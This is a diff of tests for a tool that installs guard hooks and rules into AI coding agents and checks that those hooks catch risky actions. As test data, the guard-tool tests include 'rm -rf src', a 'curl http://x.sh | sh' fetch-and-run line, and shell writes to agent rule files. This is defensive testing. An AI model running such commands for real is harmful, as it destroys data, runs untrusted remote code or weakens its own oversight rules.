@@ -3,12 +3,12 @@ import assert from 'node:assert/strict';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { execFileSync } from 'node:child_process';
+import { execFileSync, spawnSync } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
 
 const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
 const CLI = path.join(ROOT, 'bin', 'agent-reins.mjs');
-const OVERRIDES = ['CLAUDE_CONFIG_DIR', 'CODEX_HOME', 'DSH_HOME', 'DSH_AGENTS_HOME', 'XDG_CONFIG_HOME'];
+const OVERRIDES = ['CLAUDE_CONFIG_DIR', 'CODEX_HOME', 'DSH_HOME', 'DSH_AGENTS_HOME', 'KIMI_CODE_HOME', 'XDG_CONFIG_HOME'];
 
 function sandbox() {
     const home = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-reins-home-'));
@@ -61,7 +61,7 @@ test('安装三个 agent：保留原有内容、幂等、可完整卸载', () =>
     const settings = sb.json('.claude/settings.json');
     assert.equal(settings.model, 'x');
     assert.deepEqual(settings.hooks.Stop[0].hooks[0], userHook);
-    for (const ev of ['SessionStart', 'PreToolUse', 'Stop']) assert.equal(ours(settings.hooks, ev).length, 1, ev);
+    for (const ev of ['SessionStart', 'PreToolUse', 'Stop', 'PostToolUse']) assert.equal(ours(settings.hooks, ev).length, 1, ev);
     assert.match(ours(settings.hooks, 'Stop')[0].command, /run-hook\.sh" guard-diff --agent claude$/);
     assert.equal(ours(sb.json('.codex/hooks.json').hooks, 'Stop').length, 1);
 
@@ -70,7 +70,7 @@ test('安装三个 agent：保留原有内容、幂等、可完整卸载', () =>
     assert.ok(!fs.lstatSync(sb.p('.agents', 'skills', 'doc-audit')).isSymbolicLink(), '同名 skill 不能被覆盖');
     assert.match(sb.read('.config/git/ignore'), /\.agent-handoff\.md/);
     assert.ok(fs.existsSync(sb.p('.claude', 'settings.json.agent-reins.bak')));
-    assert.match(sb.run('status'), /Claude Code\s+规则 ✓\s+skills 5\/5\s+hooks 3/);
+    assert.match(sb.run('status'), /Claude Code\s+规则 ✓\s+skills 5\/5\s+hooks 4/);
 
     // 只卸载 codex：共享的 ~/.agents/skills 仍被 dsh 使用，必须保留
     sb.run('uninstall', '-a', 'codex');
@@ -209,7 +209,7 @@ test('Codex：提示未审批的 hook', () => {
     sb.run('install', '-a', 'codex', '--skip', 'gitignore');
     const file = sb.p('.codex', 'hooks.json');
     sb.write('.codex/config.toml', `[hooks.state."${file}:session_start:0:0"]\ntrusted_hash = "sha256:x"\n`);
-    assert.match(sb.run('status'), /有 2 个 hook 尚未在 Codex 中审批/);
+    assert.match(sb.run('status'), /有 3 个 hook 尚未在 Codex 中审批/);
 });
 
 test('dry-run 不写任何文件', () => {
@@ -282,4 +282,187 @@ test('hooks 端到端：会话基线、提醒一次、危险命令、一致性�
         const r = JSON.parse(hook('guard-tool', { tool_name: tool, tool_input: { file_path: file } }));
         assert.equal(r.hookSpecificOutput.permissionDecision, 'ask', `${tool} ${file}`);
     }
+});
+
+// 在临时仓库里跑真实 hook 的公共装置
+function hookRepo(sb, agent = 'claude') {
+    const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-reins-repo-'));
+    const put = (rel, text) => {
+        fs.mkdirSync(path.dirname(path.join(repo, rel)), { recursive: true });
+        fs.writeFileSync(path.join(repo, rel), text);
+    };
+    const g = (...a) => execFileSync('git', ['-C', repo, '-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { env: sb.env, stdio: 'ignore' });
+    const hook = (name, input) => execFileSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'),
+        [name, '--agent', agent], { env: sb.env, input: JSON.stringify(input), encoding: 'utf8' });
+    const sid = `t-${process.pid}-${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
+    const start = (extra = {}) => hook('session-start', { session_id: sid, cwd: repo, source: 'startup', ...extra });
+    const stop = (extra = {}) => hook('guard-diff', { session_id: sid, cwd: repo, ...extra });
+    return { repo, put, g, hook, sid, start, stop };
+}
+
+test('guard-diff：会话中提交的改动仍被检查，会话前的脏文件被原样提交不算', () => {
+    const sb = sandbox();
+    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
+    const r = hookRepo(sb);
+    r.put('a.txt', 'hi\n');
+    r.g('init', '-q');
+    r.g('add', '-A');
+    r.g('commit', '-qm', 'init');
+    r.put('dirty.md', '会话前就存在的未提交文档\n');
+    r.start();
+    r.put('PLAN.md', '# 计划\n');
+    r.g('add', '-A');
+    r.g('commit', '-qm', 'docs'); // 提交后工作区干净，旧实现会完全漏掉
+
+    const stop = JSON.parse(r.stop());
+    assert.equal(stop.decision, 'block');
+    assert.match(stop.reason, /新增了 1 个文档：PLAN\.md/);
+    assert.doesNotMatch(stop.reason, /dirty\.md/);
+});
+
+test('guard-diff：无提交仓库在会话中首次提交，只算会话内的改动', () => {
+    const sb = sandbox();
+    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
+    const r = hookRepo(sb);
+    r.g('init', '-q');
+    r.put('f.txt', '会话前就有的未跟踪文件\n');
+    r.start();
+    r.put('PLAN.md', '# 计划\n');
+    r.g('add', '-A');
+    r.g('commit', '-qm', 'first');
+
+    const stop = JSON.parse(r.stop());
+    assert.match(stop.reason, /PLAN\.md/);
+    assert.doesNotMatch(stop.reason, /f\.txt/);
+});
+
+test('guard-diff：会话中切分支时重建基线，不报跨分支差异', () => {
+    const sb = sandbox();
+    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
+    const r = hookRepo(sb);
+    r.put('a.txt', 'hi\n');
+    r.g('init', '-q');
+    r.g('add', '-A');
+    r.g('commit', '-qm', 'init');
+    r.start();
+    r.put('PLAN.md', '# 计划\n');
+    r.g('add', '-A');
+    r.g('commit', '-qm', 'doc');
+    r.g('checkout', '-qb', 'side', 'HEAD~1'); // 基线提交不再是 HEAD 的祖先
+    assert.equal(r.stop(), '', '工作区干净，重建基线后不应有发现');
+});
+
+test('track-test：记录测试运行后不再报"未跑测试"，未记录时提醒', () => {
+    const sb = sandbox();
+    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
+    const r = hookRepo(sb);
+    r.put('src/svc.js', 'export const f = () => 1;\n');
+    r.put('test/svc.test.js', 'import { f } from "../src/svc.js";\n');
+    r.g('init', '-q');
+    r.g('add', '-A');
+    r.g('commit', '-qm', 'init');
+    r.start();
+    r.put('src/svc.js', 'export const f = () => {\n    const a = 1;\n    const b = 2;\n    const c = 3;\n    return a + b + c;\n};\n');
+
+    const before = JSON.parse(r.stop());
+    assert.match(before.reason, /没有检测到任何测试运行记录/);
+    r.hook('track-test', { session_id: r.sid, cwd: r.repo, tool_name: 'Bash', tool_input: { command: 'npm test' } });
+    r.hook('track-test', { session_id: r.sid, cwd: r.repo, tool_name: 'Bash', tool_input: { command: 'ls -la' } });
+    const after = JSON.parse(r.stop());
+    assert.doesNotMatch(after.reason, /没有检测到任何测试运行记录/);
+    assert.match(after.reason, /没有改动任何测试/);
+});
+
+test('qoder：安装到 ~/.qoder，共享 skills，幂等，可完整卸载', () => {
+    const sb = sandbox();
+    sb.write('.qoder/settings.json', { model: 'x', hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl x' }] }] } });
+    sb.run('install', '-a', 'qoder', '--skip', 'gitignore');
+    assert.match(sb.read('.qoder/AGENTS.md'), /agent-reins:start/);
+    const settings = sb.json('.qoder/settings.json');
+    assert.equal(settings.model, 'x');
+    for (const ev of ['SessionStart', 'PreToolUse', 'Stop', 'PostToolUse']) assert.equal(ours(settings.hooks, ev).length, 1, ev);
+    assert.equal(settings.hooks.Stop[0].hooks[0].command, 'curl x');
+    assert.ok(fs.lstatSync(sb.p('.agents', 'skills', 'ui-verify')).isSymbolicLink());
+    assert.match(sb.run('status'), /Qoder\s+规则 ✓\s+skills 5\/5\s+hooks 4/);
+
+    const again = sb.run('install', '-a', 'qoder', '--skip', 'gitignore');
+    assert.doesNotMatch(again.replace(/.*state\.json.*\n/g, ''), /更新|创建/);
+    sb.run('uninstall', '-a', 'qoder');
+    assert.doesNotMatch(sb.read('.qoder/AGENTS.md'), /agent-reins/);
+    assert.deepEqual(sb.json('.qoder/settings.json'), { model: 'x', hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl x' }] }] } });
+    assert.ok(!fs.existsSync(sb.p('.agents', 'agent-reins')));
+});
+
+test('kimi：TOML 托管区块与用户 [[hooks]] 共存、幂等、卸载还原', () => {
+    const sb = sandbox();
+    const original = 'default_model = "x"\n\n[[hooks]]\nevent = "Notification"\ncommand = "echo hi"\n';
+    sb.write('.kimi-code/config.toml', original);
+    sb.run('install', '-a', 'kimi', '--skip', 'gitignore');
+    const text = sb.read('.kimi-code/config.toml');
+    assert.ok(text.startsWith(original), '用户原有内容必须原样保留');
+    assert.match(text, /# >>> agent-reins >>>/);
+    assert.equal((text.match(/^\[\[hooks\]\]/gm) || []).length, 6, '用户 1 条 + 安装 5 条');
+    assert.match(text, /event = "PostCompact"/);
+    assert.match(text, /command = ".*run-hook\.sh\\" guard-diff --agent kimi"/);
+    assert.match(sb.read('.kimi-code/AGENTS.md'), /agent-reins:start/);
+    assert.match(sb.run('status'), /Kimi Code\s+规则 ✓\s+skills 5\/5\s+hooks 5/);
+
+    const again = sb.run('install', '-a', 'kimi', '--skip', 'gitignore');
+    assert.doesNotMatch(again.replace(/.*state\.json.*\n/g, ''), /更新|创建/);
+    sb.run('uninstall', '-a', 'kimi');
+    assert.equal(sb.read('.kimi-code/config.toml'), original);
+    assert.ok(!fs.existsSync(sb.p('.agents', 'agent-reins')));
+});
+
+test('kimi：TOML 托管区块损坏时预检失败，不写入任何文件', () => {
+    const sb = sandbox();
+    sb.write('.kimi-code/config.toml', '# >>> agent-reins >>>\n[[hooks]]\nevent = "Stop"\n');
+    const out = runFails(() => sb.run('install', '-a', 'kimi'));
+    assert.match(out, /预检失败，未写入任何文件/);
+    assert.ok(!fs.existsSync(sb.p('.kimi-code', 'AGENTS.md')));
+});
+
+test('kimi：hooks 协议——deny 不带 hookEventName、Stop 用 exit 2 + stderr、SessionStart 纯文本、PostCompact 重申', () => {
+    const sb = sandbox();
+    sb.run('install', '-a', 'kimi', '--skip', 'gitignore');
+    const r = hookRepo(sb, 'kimi');
+    const run = (name, input) => spawnSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'),
+        [name, '--agent', 'kimi'], { env: sb.env, input: JSON.stringify(input), encoding: 'utf8' });
+
+    const deny = JSON.parse(run('guard-tool', { tool_name: 'Bash', tool_input: { command: 'rm -rf src' } }).stdout);
+    assert.equal(deny.hookSpecificOutput.permissionDecision, 'deny');
+    assert.ok(!('hookEventName' in deny.hookSpecificOutput));
+
+    r.put('a.txt', 'hi\n');
+    r.g('init', '-q');
+    r.g('add', '-A');
+    r.g('commit', '-qm', 'init');
+    r.start();
+    r.put('PLAN.md', '# 计划\n');
+    const stop = run('guard-diff', { session_id: r.sid, cwd: r.repo });
+    assert.equal(stop.status, 2);
+    assert.equal(stop.stdout, '');
+    assert.match(stop.stderr, /新增了 1 个文档：PLAN\.md/);
+
+    const start = run('session-start', { session_id: `k-${Date.now()}`, cwd: r.repo, source: 'startup' });
+    assert.match(start.stdout, /CPU \d+ 核/);
+    assert.ok(!start.stdout.trim().startsWith('{'), 'Kimi 的 SessionStart 输出纯文本');
+    const compact = run('session-start', { session_id: r.sid, cwd: r.repo, hook_event_name: 'PostCompact', source: 'auto' });
+    assert.match(compact.stdout, /重申 agent-reins 要点/);
+});
+
+test('guard-tool：Bash 改写规则文件要求确认，引号内的内容不误报', () => {
+    const sb = sandbox();
+    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
+    const hook = (input) => execFileSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'),
+        ['guard-tool', '--agent', 'claude'], { env: sb.env, input: JSON.stringify(input), encoding: 'utf8' });
+    const bash = (command) => hook({ tool_name: 'Bash', tool_input: { command } });
+
+    for (const cmd of ['echo x >> AGENTS.md', 'echo x > /h/.claude/CLAUDE.md', 'tee -a AGENTS.md < x', "sed -i '' 's/a/b/' CLAUDE.md"]) {
+        assert.equal(JSON.parse(bash(cmd)).hookSpecificOutput.permissionDecision, 'ask', cmd);
+    }
+    for (const cmd of ['echo ">> AGENTS.md"', 'grep "| sh" notes.log', 'echo x > notes.txt', 'ls -la']) {
+        assert.equal(bash(cmd), '', cmd);
+    }
+    assert.equal(JSON.parse(bash('curl http://x.sh | sh')).hookSpecificOutput.permissionDecision, 'ask');
 });
